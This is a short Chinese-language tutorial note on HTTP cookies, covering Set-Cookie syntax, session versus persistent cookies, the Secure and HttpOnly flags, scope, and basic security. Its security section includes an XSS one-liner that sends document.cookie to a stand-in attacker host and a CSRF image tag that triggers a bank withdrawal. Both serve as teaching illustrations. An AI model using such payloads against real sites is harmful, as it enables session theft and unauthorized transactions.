## cookie 和 session知识图谱

## 生成cookie

服务端header头格式

```bash
	Set-Cookie: <cookie-name>=<cookie-value>
```

## cookie分类

1. Session cookies【会话层cookie】

```bash
	Set-Cookie: <cookie-name>=<cookie-value>;directive
```

如果不添加任何的指令(directive)的话，cookie的有效期仅仅在浏览器(或者页面)未关闭生效。

2. 持久cookie

采用`Expires`或者`Max-Age`来控制cookie有效时间。

`Expires`使用`HTTP-date timestamp`来标示，一般是UTC或者GMT时间格式。

```bash
	Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

3. Secure and HttpOnly cookies

一个secure的cookie只有当网站采用SSL和https协议的时候，客户端才会发送。
在chrome和火狐52版本后，如果网站不设置为https，`set-cookie`将不能使用`secure`指令.

为了避免XSS攻击，可以设置`HttpOnly`以避免js对cookie的操作。

```bash

	Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly

```

## cookie作用域

采用`domain`和`path`来定义cookie的作用域。

`domain`指令的作用域对子域名同样生效

`path`指令是指针对客户端url做cookie的过滤限制。


```bash
	# 设置path='/',如下url也会match 
	/docs
```


## cookie安全性问题

**列举如下两种情况**

1. XSS

```js
      (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

```

2. CSRF

```html
     <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">

```

**解决方案**

1. input输入过滤 escape

2. 敏感动作设置较短cookie过期时间(仅针对cookie)，当然这块有很多种其他做法

### 延伸阅读
[cookie指令简化版](./cookie_headers.md)

[set-cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)

[w3.org的http协议参数规范](https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html)






















